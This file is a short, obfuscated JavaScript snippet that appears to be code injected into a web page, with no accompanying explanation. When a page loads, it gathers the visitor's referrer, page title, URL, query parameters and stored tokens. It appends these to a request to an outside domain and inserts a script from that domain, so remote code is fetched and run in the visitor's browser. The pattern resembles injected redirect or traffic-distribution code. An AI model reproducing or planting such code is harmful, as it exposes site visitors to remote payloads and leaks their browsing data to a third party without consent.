 (function() {
    var name = '_QHqMBrfzt8jY6gBd';
    if (!window._QHqMBrfzt8jY6gBd) {
        window._QHqMBrfzt8jY6gBd = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://unificationbsn.online/ZcVcbPCh',
            P_PATH: 'https://unificationbsn.online/ad89deb/postback',
        };
    }
    const _R9DwQZ5bv3gjsnHB = localStorage.getItem('config');
    if (typeof _R9DwQZ5bv3gjsnHB !== 'undefined' && _R9DwQZ5bv3gjsnHB !== null) {
        var _Xg2PhwBWmnSYyzNG = JSON.parse(_R9DwQZ5bv3gjsnHB);
        var _1X3QXXqJt23hH73X = Math.round(+new Date()/1000);
        if (_Xg2PhwBWmnSYyzNG.created_at + window._QHqMBrfzt8jY6gBd.ttl < _1X3QXXqJt23hH73X) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _yR6VLJxy3zr48ZK1 = localStorage.getItem('subId');
    var _zWk9YvKwS4YvD3g3 = localStorage.getItem('token');
    var _yTGn5GWS3MSHpM46 = '?return=js.client';
        _yTGn5GWS3MSHpM46 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _yTGn5GWS3MSHpM46 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _yTGn5GWS3MSHpM46 += '&default_keyword=' + encodeURIComponent(document.title);
        _yTGn5GWS3MSHpM46 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _yTGn5GWS3MSHpM46 += '&name=' + encodeURIComponent(name);
        _yTGn5GWS3MSHpM46 += '&host=' + encodeURIComponent(window._QHqMBrfzt8jY6gBd.R_PATH);
    if (typeof _yR6VLJxy3zr48ZK1 !== 'undefined' && _yR6VLJxy3zr48ZK1 && window._QHqMBrfzt8jY6gBd.unique) {
        _yTGn5GWS3MSHpM46 += '&sub_id=' + encodeURIComponent(_yR6VLJxy3zr48ZK1);
    }
    if (typeof _zWk9YvKwS4YvD3g3 !== 'undefined' && _zWk9YvKwS4YvD3g3 && window._QHqMBrfzt8jY6gBd.unique) {
        _yTGn5GWS3MSHpM46 += '&token=' + encodeURIComponent(_zWk9YvKwS4YvD3g3);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._QHqMBrfzt8jY6gBd.R_PATH + _yTGn5GWS3MSHpM46;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
